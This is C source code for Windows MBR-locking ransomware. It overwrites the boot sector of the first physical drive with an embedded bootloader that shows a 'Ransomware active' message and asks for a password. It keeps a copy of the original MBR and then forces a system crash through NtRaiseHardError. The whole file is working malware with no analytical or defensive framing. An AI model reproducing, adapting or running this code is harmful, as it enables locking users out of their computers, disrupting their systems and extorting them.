#include <stdio.h>
#include <Windows.h>

#define SECTOR_SIZE 512
#define MBR_SIG "\x55\xAA"

#pragma comment(lib, "ntdll.lib")

unsigned char bootloader[] = "\x31\xC0\x31\xDB\x31\xC9\x31\xD2\x8E\xC0\x8E\xD8\xB8\x01\x13\x31\xDB"
"\xB3\x0F\x8A\x0E\xDE\x7C\x31\xD2\xBD\x81\x7C\xCD\x10\x31\xF6\x3B\x36\x17\x7D\x74\x19\xB4\x01\xCD"
"\x16\x74\xF4\x31\xC0\xCD\x16\xB4\x0E\x31\xDB\xCD\x10\x3A\x84\x12\x7D\x75\x19\x46\xEB\xE1\xB8\x01"
"\x13\x31\xDB\xB3\x0F\x8A\x0E\x11\x7D\x31\xD2\xB6\x04\xBD\xFF\x7C\xCD\x10\xEB\x18\xB8\x01\x13\x31"
"\xDB\xB3\x0F\x8A\x0E\xFE\x7C\x31\xD2\xB6\x04\xBD\xDF\x7C\xCD\x10\xEB\x00\xEB\xFE\xB4\x02\xB0\x02"
"\xB5\x00\xB1\x02\xB6\x00\xB2\x80\xBB\x00\x7E\xCD\x13\xE9\x7F\x01\x52\x61\x6E\x73\x6F\x6D\x77\x61"
"\x72\x65\x20\x61\x63\x74\x69\x76\x65\x21\x20\x54\x68\x65\x20\x6D\x61\x63\x68\x69\x6E\x65\x20\x77"
"\x69\x6C\x6C\x20\x6F\x6E\x6C\x79\x20\x73\x74\x61\x72\x74\x20\x77\x68\x65\x6E\x20\x74\x68\x65\x20"
"\x63\x6F\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x20\x69\x73\x20\x65\x6E\x74\x65"
"\x72\x65\x64\x2E\x20\x0A\x0D\x6B\x65\x79\x3A\x20\x00\x5D\x57\x72\x6F\x6E\x67\x20\x70\x61\x73\x73"
"\x77\x6F\x72\x64\x2C\x20\x61\x63\x63\x65\x73\x73\x20\x64\x65\x6E\x69\x65\x64\x21\x00\x1F\x43\x6F"
"\x72\x72\x65\x63\x74\x20\x70\x61\x73\x73\x77\x6F\x72\x64\x21\x00\x12\x44\x61\x76\x69\x21\x05\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x55\xAA\xB4\x03\xB0\x01\xB5\x00\xB1\x01\xB6"
"\x00\xB2\x80\xBB\x00\x80\xCD\x13\xEA\x00\x00\xFF\xFF\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN Client, PBOOLEAN WasEnabled);
NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PVOID Parameters, ULONG ResponseOption, PULONG ResponsePointer);

int main() {

	HANDLE hDisk;
	unsigned char cBackup[SECTOR_SIZE];
	unsigned char cInfected[SECTOR_SIZE*2];
	DWORD bytesRead = 0;
	DWORD bytesWritten = 0;
	BOOLEAN privilegeOld = FALSE;
	ULONG response = 0;

	hDisk = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hDisk == INVALID_HANDLE_VALUE) {
		printf("Falhou o CreateFile\n");
		exit(1);
	}

	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!ReadFile(hDisk, cBackup, SECTOR_SIZE, &bytesRead, NULL)) {
		printf("Deu ruim em ReadFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	if (memcmp(&cBackup[SECTOR_SIZE - 2], MBR_SIG, 2)) {
		printf("A assinatura nï¿½o confere\n");
		CloseHandle(hDisk);
		exit(1);
	}


	SetFilePointer(hDisk, 0, NULL, FILE_BEGIN);

	if (!WriteFile(hDisk, bootloader, SECTOR_SIZE*2, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile\n");
		CloseHandle(hDisk);
		exit(1);
	}

	SetFilePointer(hDisk, SECTOR_SIZE * 2, NULL, FILE_BEGIN);
	if (!WriteFile(hDisk, cBackup, SECTOR_SIZE, &bytesWritten, NULL)) {
		printf("Deu ruim em WriteFile2\n");
		CloseHandle(hDisk);
		exit(1);
	}

	RtlAdjustPrivilege(19, TRUE, FALSE, &privilegeOld);
	NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &response);

	return(0);

}
